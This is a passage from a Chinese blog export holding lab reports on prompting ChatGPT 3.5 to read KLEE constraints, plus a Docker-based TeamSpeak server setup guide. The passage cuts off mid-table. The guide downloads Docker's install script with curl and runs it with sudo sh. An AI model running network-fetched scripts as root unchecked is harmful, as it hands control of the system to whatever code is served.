    <content><![CDATA[<h2 id="实践二-通过约束生成测试用例输入-实验报告"><a href="#实践二-通过约束生成测试用例输入-实验报告" class="headerlink" title="实践二_通过约束生成测试用例输入 实验报告"></a>实践二_通过约束生成测试用例输入 实验报告</h2><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><p>本次实践的主要任务是将实践一转换得到的 CPP 代码通过约束求解得到的约束，借助大语言模型得到相 应约束的测试用例输入，一是进一步评估大语言模型对于抽象表示的识别能力，二是探索生成测试用例 输入的新方法，在下述样例中会详细阐述。 在上交实践一成果后，助教会生成好对应代码的约束，分发给各位同学作为实践二的原始材料，不需要 大家去仔细学习约束求解的过程，大概了解约束是怎样的东西即可，想了解的同学也可以查看附录内容 自行探索。</p>
<span id="more"></span>

<p> 举例：</p>
<p>以下仍旧以  008_sum_product.cpp 举例（下简称  008 ），我们聚焦于主函数（有略微改动，会解释 原因）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// other codes ...</span></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;&#125;;</span><br><span class="line"> std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt; result = <span class="built_in">sum_product</span>(numbers);</span><br><span class="line"> <span class="type">int</span> sum = std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(result);</span><br><span class="line"> <span class="type">int</span> product = std::<span class="built_in">get</span>&lt;<span class="number">1</span>&gt;(result);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在主函数中主要是对功能函数  sum_product() 的调用与测试，我们的约束则会聚焦于功能函数的入 参，即  numbers 。（相较于实践一说明中的代码，这里将入参变为变量，方便后续操作） numbers 的类型为  素 el vector ，对于该容器来说，约束求解会聚焦于其长度  ements 。在  size 以及其中的元 008 样例中，容器元素的变化并不会对约束产生影响（对于其他的代码，可能会产 生影响），所以  008 样例求解生成的约束主要针对  size 。 简单理解为，在  008 程序中，当  size 有不同的取值，程序就会运行不同的分支。抽象表示  取值范围，就是所谓的<strong>约束</strong>。</p>
<blockquote>
<p>此处仅为举例，在其他程序中，约束可能会同时针对多个变量，如  vector&lt;&gt; 的长度与元素都会 有约束。</p>
</blockquote>
<p>为了约束不那么冗长，助教在生成约束前会将类似  size 的变量限定在一个较小的范围内，如  [0,3) 。以下是  008 样例根据约束求解的要求更改后的代码：（这一步不需要大家完成，由助教来 做，此处仅为示意，以解释约束是怎么得来的，是长什么样的）</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">// other codes ...</span></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;&#125;;</span><br><span class="line"> <span class="type">int</span> size;</span><br><span class="line"> <span class="built_in">klee_make_symbolic</span>(&amp;size, <span class="built_in">sizeof</span>(size), <span class="string">&quot;size&quot;</span>); <span class="comment">// 这是约束求解用到的符号生成函</span></span><br><span class="line">数</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 约束求解时会使 size 变为不同的值，所以此处没有初始化</span></span><br><span class="line"><span class="type">int</span> elements[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// 该程序中元素不进入约束表达式</span></span><br><span class="line"><span class="comment">// 对于其他程序，也会为每个元素生成符号，加入约束求解中</span></span><br><span class="line"><span class="keyword">if</span> (size &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="comment">// 限定 numbers 的实际 size 在 [0,3) 范围内</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size &amp;&amp; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"> numbers.<span class="built_in">push_back</span>(elements[i]);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt; result = <span class="built_in">sum_product</span>(numbers);</span><br><span class="line"> <span class="comment">// 由于只需要约束求解，所以不需要运行后续测试</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下即为上述更改后的  008 样例求解得到的约束：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">Constraints <span class="number">1</span>:</span><br><span class="line"> (Eq <span class="keyword">false</span></span><br><span class="line"> (Sle <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>)))----------------</span><br><span class="line"> Constraints <span class="number">2</span>:</span><br><span class="line"> (Sle <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Eq <span class="keyword">false</span></span><br><span class="line"> (Slt <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>)))----------------</span><br><span class="line"> Constraints <span class="number">3</span>:</span><br><span class="line"> (Sle <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Eq <span class="keyword">false</span></span><br><span class="line"> (Slt <span class="number">1</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>)))----------------</span><br><span class="line"> Constraints <span class="number">4</span>:</span><br><span class="line"> (Sle <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">0</span></span><br><span class="line">(ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">1</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Eq <span class="keyword">false</span></span><br><span class="line"> (Slt <span class="number">2</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>)))----------------</span><br><span class="line"> Constraints <span class="number">5</span>:</span><br><span class="line"> (Sle <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">0</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">1</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line"> (Slt <span class="number">2</span></span><br><span class="line"> (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))----------------</span><br></pre></td></tr></table></figure>

<p>由于 008 代码十分简单，所以这些约束也相对规整。因为在  size 取不同的值时，程序都会运行到不 同的分支（最终影响就是  numbers 的不同，即功能函数运行的分支不同），所以上述约束看起来就是 枚举 size 的不同取值，用合取范式表示。 解释一下，约束一表示的意思是  (0 &lt;&#x3D; size) &#x3D;&#x3D; false， 约束二表示的意思是  0 &lt;&#x3D; size &amp;&amp; ((0 &lt; size) &#x3D;&#x3D; false)，以此类推。 这样的约束文本就是大家在上交实践一成果后会得到的实践二原材料。请大家设计相应的提示语 （prompt），让大语言模型理解这样的约束，并生成相应的测试用例输入。</p>
<blockquote>
<p>注意，如 008 样例，约束中仅含有  size 变量，所以大语言模型可能只会生成不同的  变量作为测试用例输入，但其实  008 需要的测试用例输入是一个  size  vector 类型的变量，不 止是它的  size ，所以请大家自行想办法生成合法的测试用例输入（即完整的  numbers ），例如 使用随机数去填充容器，让大语言模型额外生成容器的元素等等。</p>
</blockquote>
<h3 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h3><p>使用的大模型为<strong>chatgpt3.5</strong>；</p>
<p>设计的<strong>prompt</strong>为两部分，第一部分为给大模型一个例子用以理解和作为语境：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">我们可以根据约束生成测试用例，以下是一个约束的例子：</span><br><span class="line">Constraints:</span><br><span class="line">(Sle <span class="number">0</span></span><br><span class="line">      (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line">(Slt <span class="number">0</span></span><br><span class="line">      (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>))</span><br><span class="line">(Eq <span class="keyword">false</span></span><br><span class="line">     (Sle <span class="number">0</span></span><br><span class="line">          (ReadLSB w32 <span class="number">0</span> x0)))</span><br><span class="line">(Eq <span class="keyword">false</span></span><br><span class="line">     (Slt <span class="number">1</span></span><br><span class="line">          (ReadLSB w32 <span class="number">0</span> <span class="keyword">size</span>)))</span><br><span class="line">这些的含义是：</span><br><span class="line"><span class="keyword">size</span> &gt;=<span class="number">0</span></span><br><span class="line"><span class="keyword">size</span> &gt; <span class="number">0</span></span><br><span class="line">x0 &gt; <span class="number">0</span>  为 <span class="keyword">false</span></span><br><span class="line"><span class="keyword">size</span> &gt; <span class="number">1</span> 为 <span class="keyword">false</span></span><br><span class="line">根据这几个条件可知，<span class="keyword">size</span> 只能为<span class="number">1</span>，x0为<span class="number">0</span>或者负数，按照此随机生成一个测试用例为：<span class="keyword">size</span> = <span class="number">1</span>，array = [<span class="number">0</span>]</span><br><span class="line">你现在理解约束的含义了吗</span><br></pre></td></tr></table></figure>

<p>第二部分则把约束给大模型，让大模型根据约束生成测试用例，例如：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">现在请理解以下约束的含义，并为此随机生成一个测试用例：</span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line">      (ReadLSB w32<span class="number"> 0 </span>size))</span><br><span class="line">(Slt 0</span><br><span class="line">      (ReadLSB w32<span class="number"> 0 </span>size))</span><br><span class="line">(Sle 0</span><br><span class="line">      (ReadLSB w32<span class="number"> 0 </span>x0))</span><br><span class="line">(Sle (ReadLSB w32<span class="number"> 0 </span>x0)</span><br><span class="line">      3)</span><br><span class="line">(Eq false</span><br><span class="line">     (Slt 1</span><br><span class="line">          (ReadLSB w32<span class="number"> 0 </span>size)))</span><br><span class="line">(Eq false</span><br><span class="line">     (Eq 1</span><br><span class="line">         (SRem w32 (ReadLSB w32<span class="number"> 0 </span>x0)</span><br><span class="line">                   2)))</span><br></pre></td></tr></table></figure>



<p>大模型对这些较简单的约束的理解基本没问题，但在生成测试用例时有以下几点问题：</p>
<ol>
<li>一开始不知道`Eq false`的含义，因此还需要解释与纠错；</li>
<li>大模型对条件的结合有时候会出现问题，当出现对一个变量的多个条件时，可能会出现数学上的错误；</li>
<li>大模型对生成字符串的约束并不理解，还是会生成纯数字的测试用例；</li>
<li>对于在prompt中没有出现过例子的约束条件，大模型可能会理解错误；</li>
</ol>
<p>以下是与大模型对话的截图：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145233358.png" alt="image-20231201145233358"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145304984.png" alt="image-20231201145304984"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145317585.png" alt="image-20231201145317585"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145330823.png" alt="image-20231201145330823"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145340644.png" alt="image-20231201145340644"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145355814.png" alt="image-20231201145355814"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231201145401463.png" alt="image-20231201145401463"></p>
]]></content>
      <categories>
        <category>嵌入式方向</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建自己的TeamSpeak服务器</title>
    <url>/2024/12/16/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84TeamSpeak%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>由于为了域名备案整了个阿里云ECS服务器，闲着没用就拿来搭个TeamSpeak。</p>
<p>如果你熟悉一定的docker操作，那么本章教程对你不难。</p>
<blockquote>
<p>TeamSpeak 是一种高性能的语音通信软件，专为团队协作和实时沟通设计。它广泛用于在线游戏、教育培训、企业会议等场景，因其低延迟、高音质和安全性备受用户青睐。TeamSpeak 允许用户通过服务器创建专属的语音聊天室，支持灵活的权限管理和大规模用户连接。通过客户端和服务器分离的架构，TeamSpeak 可在 Windows、macOS、Linux、iOS 和 Android 等平台上使用，提供跨平台、稳定的语音交流体验。</p>
</blockquote>
<h3 id="下载docker并更换镜像源"><a href="#下载docker并更换镜像源" class="headerlink" title="下载docker并更换镜像源"></a>下载docker并更换镜像源</h3><p>进入服务器命令行，下载并安装docker。</p>
<span id="more"></span>

<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">curl</span> -<span class="string">fsSL</span> <span class="string">https</span>://<span class="string">get</span>.<span class="string">docker</span>.<span class="string">com</span> -<span class="string">o</span> <span class="built_in">get-docker.sh</span></span><br><span class="line"><span class="string">sudo</span> <span class="string">sh</span> <span class="built_in">get-docker.sh</span></span><br></pre></td></tr></table></figure>

<p>为docker更换镜像源：</p>
<p>参考：<a href="https://help.aliyun.com/zh/ecs/use-cases/install-and-use-docker-on-a-linux-ecs-instance#8dca4cfa3dn0e">安装Docker并使用镜像仓库ACR_云服务器 ECS(ECS)-阿里云帮助中心</a></p>
<p>登录<a href="https://cr.console.aliyun.com/">容器镜像服务控制台</a>，在左侧导航栏选择<strong>镜像工具&gt;镜像加速器</strong>，在镜像加速器页面获取加速器地址。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/df921e600f75c9f91b02f631051e5678.png" alt="df921e600f75c9f91b02f631051e5678" style="zoom:50%;" />

<p>然后在服务器命令行中输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;&lt;你的镜像地址&gt;&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="下载teamspeak镜像"><a href="#下载teamspeak镜像" class="headerlink" title="下载teamspeak镜像"></a>下载teamspeak镜像</h3><p>我一开始是直接在服务里拉取teamspeak镜像的（即直接<code>docker pull teamspeak</code>)，结果后面docker run时容器起不起来（Exited），docker logs后发现这个版本被废弃了。原因是阿里云ECS的Docker Hub（相当于docker仓库）版本似乎有点老，里面没有最新的teamspeak镜像，解决：</p>
<p>如果你的本地机安装了docker，可以先启动docker，然后运行以下命令（注意不是服务器里）：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker pull teamspeak  <span class="comment">// 拉取teamspeak最新镜像</span></span><br><span class="line">docker save -o teamspeak.tar teamspeak:latest <span class="comment">// 保存镜像到文件中</span></span><br><span class="line">scp teamspeak.tar <span class="symbol">root@<span class="keyword">&lt;你的服务器ip&gt;</span></span>:~ <span class="comment">// 使用scp将文件传到服务器中</span></span><br></pre></td></tr></table></figure>

<p>然后到服务器里运行：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">docker load -<span class="selector-tag">i</span> teamspeak<span class="selector-class">.tar</span> <span class="comment">// 从文件加载镜像</span></span><br><span class="line">docker images <span class="comment">// 查看已有镜像</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217134145507.png" alt="image-20241217134145507"></p>
<p>当然还有其他很多办法，这里不赘述了。</p>
<h3 id="配置云服务器安全组规则"><a href="#配置云服务器安全组规则" class="headerlink" title="配置云服务器安全组规则"></a>配置云服务器安全组规则</h3><p>进入云服务器控制台，左侧栏选择网络与安全&#x2F;安全组，创建安全组，然后在入方向手动添加以下几个规则，将这些端口放行。</p>
<p>注意，<strong>端口9987选择UDP</strong>。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/079336d9027d1b097403dff80887a48d.png" alt="079336d9027d1b097403dff80887a48d"></p>
<p>创建完成后，点击该安全组，然后将ECS实例加入该安全组。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/14c5ce1a0037dbc36cea55f7cffd29ad.png" alt="14c5ce1a0037dbc36cea55f7cffd29ad"></p>
<h3 id="启动docker容器"><a href="#启动docker容器" class="headerlink" title="启动docker容器"></a>启动docker容器</h3><p>在服务器命令行输入：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9987</span>:<span class="number">9987</span>/udp -p <span class="number">10011</span>:<span class="number">10011</span> -p <span class="number">30033</span>:<span class="number">30033</span> -e TS3SERVER_LICENSE=accept teamspeak</span><br></pre></td></tr></table></figure>

<p>然后输入：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>

<p>查看容器是否正常运行（STATUS不是Exited），同时记住这里的容器ID。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/09da42c46a962b93997581a794ca4419.png" alt="09da42c46a962b93997581a794ca4419"></p>
<p>然后输入，查看token：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">docker logs <span class="tag">&lt;<span class="name">你的容器ID</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c1147a9ff7b2e5f6bd9482e19d9af12c.png" alt="c1147a9ff7b2e5f6bd9482e19d9af12c"></p>
<p>到这里我们的teamspeak服务器就算成功搭建好了。</p>
<h3 id="下载安装TeamSpeak客户端"><a href="#下载安装TeamSpeak客户端" class="headerlink" title="下载安装TeamSpeak客户端"></a>下载安装TeamSpeak客户端</h3><p>进入官网，下载所需的版本：<a href="https://www.teamspeak.com/en/downloads/">TeamSpeak Downloads | TeamSpeak</a>。（TeamSpeak客户端的中文版做的不好，原因：<a href="https://teamspeak.app/docs/advanced/why-not-ts-cn/">为何不要使用 TeamSpeak 中文站 – Vigorous Pro</a>）</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217140250569.png" alt="image-20241217140250569" style="zoom: 33%;" />

<p>然后按照流程安装，注意不用下载overwolf，将其取消掉。</p>
<h3 id="TeamSpeak客户端使用"><a href="#TeamSpeak客户端使用" class="headerlink" title="TeamSpeak客户端使用"></a>TeamSpeak客户端使用</h3><p>参考：<a href="https://www.bilibili.com/opus/802156490788962373">TeamSpeak3客户端安装+汉化+初步上手(附免费服务器地址 - 哔哩哔哩</a></p>
<p>可以选择安装汉化，大家自己选择。</p>
<p>打开后提示让你注册或登陆账号，这是可选的，如果是只使用自己搭建的teamspeak，可以不用注册。</p>
<h4 id="对于管理员"><a href="#对于管理员" class="headerlink" title="对于管理员"></a>对于管理员</h4><p>连接服务器，先点击”Connections&#x2F;Connect“，输入服务器的公网IP，取一个昵称，然后输入前面docker logs查到的token，勾选Enable myTeamSpeak features。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/bdff469f08dbe01fdc085c3cc75a19d1.png" alt="bdff469f08dbe01fdc085c3cc75a19d1"></p>
<p>然后创建Channel：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217143040749.png" alt="image-20241217143040749" style="zoom:50%;" />

<p>管理员可以设置密码，更名，设置频道类型等。</p>
<h4 id="对于访客"><a href="#对于访客" class="headerlink" title="对于访客"></a>对于访客</h4><p>同样的，点击”Connections&#x2F;Connect“，输入服务器的公网IP，输入密码（如果有），取一个昵称即可，不需要输入token。</p>
<p>耳机&#x2F;麦克风设置：点击“Tools&#x2F;Options”，在“Playback”&#x2F;“Capture”自己设置，其中“Typing attenuation”为屏蔽键盘声，“Echo cancellation”为消除回声。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8af3d66721d87e932ed27c589a4a2f6f.png" alt="8af3d66721d87e932ed27c589a4a2f6f"></p>
]]></content>
      <categories>
        <category>云服务器</category>
      </categories>
      <tags>
        <tag>阿里云</tag>
        <tag>ECS</tag>
        <tag>teamspeak</tag>
        <tag>语音通信</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式方向实践实验四</title>
    <url>/2024/12/15/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%96%B9%E5%90%91%E5%AE%9E%E8%B7%B5%E5%AE%9E%E9%AA%8C%E5%9B%9B/</url>
    <content><![CDATA[<h2 id="实践四-评估LLM对约束表达式的匹配能力-实验报告"><a href="#实践四-评估LLM对约束表达式的匹配能力-实验报告" class="headerlink" title="实践四_评估LLM对约束表达式的匹配能力 实验报告"></a>实践四_评估LLM对约束表达式的匹配能力 实验报告</h2><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>在实践二中，大家已经将约束表达式交由大语言模型去生成相应的测试用例输入，而在现实的工程环境 下，并没有所谓的正确代码，只有需求文本（即功能说明注释）与待测试的代码，这时我们可以将待测 试代码的约束表达式交由大语言模型，让其辅助判断是否与功能说明相符，是否有错误或遗漏。 </p>
<p>本次实践的主要任务是模拟在没有标准代码的情况下，通过将待测试代码的约束表达式与功能说明注释 交给大语言模型，让其判断是否相符，以评估大语言模型对约束表达式的理解能力与匹配能力，从而探 索待测代码的约束表达式能否直接交给大语言模型判断对错，使得测试代码更加方便，准确。</p>
<p> 本次实践的原材料依旧为上交实践一成果后分发到的约束，要求大家将每份代码的约束表达式与对应的 功能说明注释交给大语言模型，设计提示语，让其判断是否相符，是否有遗漏等匹配情况，记录下大语 言模型的判断结果（正确&#x2F;错误&#x2F;遗漏&#x2F;……）并计算其判断正确率。</p>
<p> 为了防止大语言模型的惯性回答，要求将分发得到的约束表达式进行一定的变异（比如故意改成错 的），来测试其判断正确率。也可以将功能说明进行一定的改动，使其与约束表达式不相符。对于一份 正确的约束，要求至少变异为一份错误的&#x2F;遗漏的约束。 同时由于大语言模型的不稳定性，在评估判断正确率时，应用相同的提示语多次向大语言模型提问（无 上下文，开新的对话框提问才算为多次），取平均值，本次实践要求每份正确&#x2F;错误的约束至少重复提 问 3 次，方可评估其判断正确率。</p>
<p> 本次实践的成果要求为一份实验报告，包含你所设计的提示语（prompt）、每条约束表达式及判断结 果（文本形式记录）与大语言模型对话的截图（两三张即可），并记录下大语言模型对于约束表达式判 断正确率（请按照上述要求重复生成后再计算正确率）。</p>
<span id="more"></span>

<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>使用的大预言模型为<strong>chatgpt3.5</strong>。</p>
<p>一共有五个程序，分别为：121_solution、122_add_elements、123_get_odd_collatz、124_valid_date、125_split_words。</p>
<p>对于每个程序，提供了五份对应的正确约束，以及一个错误约束和一个遗漏的约束，并且每份约束重复向大模型提问三次（无上下文，开新的对话框提问）。</p>
<p>以下是与大模型对话的<strong>prompt</strong>的示例：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">我将为你提供一个程序的功能说明注释和七个约束表达式，请你帮我检验这些约束表达式是否符合该程序的功能说明，对于每个约束，请回答符合/错误/遗漏之一。</span><br><span class="line">以下是功能说明注释：</span><br><span class="line">/*Given a non-empty list of integers, return the sum of all of the odd elements that are in even positions.</span><br><span class="line"><span class="code">    Examples</span></span><br><span class="line"><span class="code">    solution([5, 8, 7, 1]) ==&gt; 12</span></span><br><span class="line"><span class="code">    solution([3, 3, 3, 3, 3]) ==&gt; 9</span></span><br><span class="line"><span class="code">    solution([30, 13, 24, 321]) ==&gt;0</span></span><br><span class="line">*/</span><br><span class="line">以下是具体的约束，不同的约束使用分隔符隔开：</span><br><span class="line">Constraints:</span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Sle 0</span></span><br><span class="line"><span class="section">          (ReadLSB w32 0 size)))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Slt 0</span></span><br><span class="line"><span class="section">          (ReadLSB w32 0 size)))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Slt 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Sle 0</span></span><br><span class="line"><span class="code">          (ReadLSB w32 0 x0)))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Slt 1</span></span><br><span class="line"><span class="section">          (ReadLSB w32 0 size)))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Slt 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 x0))</span></span><br><span class="line">(Sle (ReadLSB w32 0 x0)</span><br><span class="line"><span class="code">      3)</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Slt 1</span></span><br><span class="line"><span class="code">          (ReadLSB w32 0 size)))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Eq 1</span></span><br><span class="line"><span class="code">         (SRem w32 (ReadLSB w32 0 x0)</span></span><br><span class="line"><span class="section">                   2)))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Slt 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 x0))</span></span><br><span class="line">(Sle (ReadLSB w32 0 x0)</span><br><span class="line"><span class="code">      3)</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Slt 1</span></span><br><span class="line"><span class="code">          (ReadLSB w32 0 size)))</span></span><br><span class="line">(Eq 1</span><br><span class="line"><span class="code">     (SRem w32 (ReadLSB w32 0 x0)</span></span><br><span class="line"><span class="section">               2))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">	(Slt 0</span></span><br><span class="line"><span class="code">     	 (ReadLSB w32 0 size)))</span></span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 x0))</span></span><br><span class="line">(Sle (ReadLSB w32 0 x0)</span><br><span class="line"><span class="code">      3)</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Slt 1</span></span><br><span class="line"><span class="code">          (ReadLSB w32 0 size)))</span></span><br><span class="line">(Eq false</span><br><span class="line"><span class="code">     (Eq 1</span></span><br><span class="line"><span class="code">         (SRem w32 (ReadLSB w32 0 x0)</span></span><br><span class="line"><span class="section">                   2)))</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line">Constraints:</span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Slt 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 size))</span></span><br><span class="line">(Sle 0</span><br><span class="line"><span class="code">      (ReadLSB w32 0 x0))</span></span><br><span class="line">(Sle (ReadLSB w32 0 x0)</span><br><span class="line"><span class="code">      3)</span></span><br><span class="line">(Eq 1</span><br><span class="line"><span class="code">     (SRem w32 (ReadLSB w32 0 x0)</span></span><br><span class="line"><span class="code">               2))</span></span><br></pre></td></tr></table></figure>



<p>最后的结果如下，其中<strong>标粗</strong>表示大模型的回答与正确答案不符：</p>
<p>程序1：</p>
<table>
<thead>
<tr>
<th>121_solution</th>
<th>第一次</th>
<th>第二次</th>
<th>第三次</th>
</tr>
</thead>
<tbody><tr>
<td><strong>约束1</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束2</strong></td>
<td>符合</td>
<td><strong>错误</strong></td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束3</strong></td>
<td>符合</td>
<td><strong>错误</strong></td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束5</strong></td>
<td>符合</td>
<td>符合</td>
